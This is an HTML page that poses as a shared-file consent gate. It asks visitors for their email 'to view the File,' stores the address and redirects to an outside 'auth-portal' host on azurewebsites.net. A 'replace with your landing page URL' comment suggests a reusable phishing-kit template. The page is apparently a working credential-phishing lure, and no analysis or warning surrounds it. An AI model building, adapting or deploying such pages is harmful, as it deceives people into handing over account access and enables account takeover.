<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Consent and Permissions</title>
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-image: url('https://i.imgur.com/iIQ6VfU.jpeg');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            color: #333;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
            text-align: center;
            max-width: 400px;
            width: 100%;
            animation: fadeIn 1s ease-in-out;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        h2 {
            font-size: 2em;
            margin-bottom: 10px;
            color: #2c3e50;
        }
        p {
            font-size: 1.1em;
            margin-bottom: 20px;
            color: #555;
        }
        input[type="email"] {
            padding: 12px;
            width: 100%;
            margin: 15px 0;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 1em;
            transition: border-color 0.3s ease;
        }
        input[type="email"]:focus {
            border-color: #6e8efb;
            outline: none;
        }
        button {
            padding: 15px 40px;
            background: linear-gradient(90deg, #6e8efb, #a777e3);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 1.2em;
            cursor: pointer;
            transition: transform 0.2s ease, box-shadow 0.2s ease;
        }
        button:hover {
            transform: scale(1.05);
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        }
        .error {
            color: #e74c3c;
            font-size: 0.9em;
            margin-top: 10px;
            display: none;
        }
        @media (max-width: 480px) {
            .container {
                padding: 20px;
            }
            button {
                padding: 12px 30px;
                font-size: 1em;
            }
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <h2>Welcome Aboard!</h2>
        <p>Enter your email to view the File.</p>
        <input type="email" id="emailInput" placeholder="Enter your email" required>
        <p id="errorMessage" class="error">Please enter a valid email address.</p>
        <button onclick="validateAndRedirect()">Continue</button>
    </div>

    <script>
        function validateAndRedirect() {
            const emailInput = document.getElementById('emailInput').value;
            const errorMessage = document.getElementById('errorMessage');
            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

            if (emailPattern.test(emailInput)) {
                localStorage.setItem('userEmail', emailInput);
                window.location.href = 'https://auth-portal-784-13981.azurewebsites.net/c'; // Replace with your landing page URL
            } else {
                errorMessage.style.display = 'block';
            }
        }

        document.getElementById('emailInput').addEventListener('input', () => {
            document.getElementById('errorMessage').style.display = 'none';
        });
    </script>
</body>
</html>
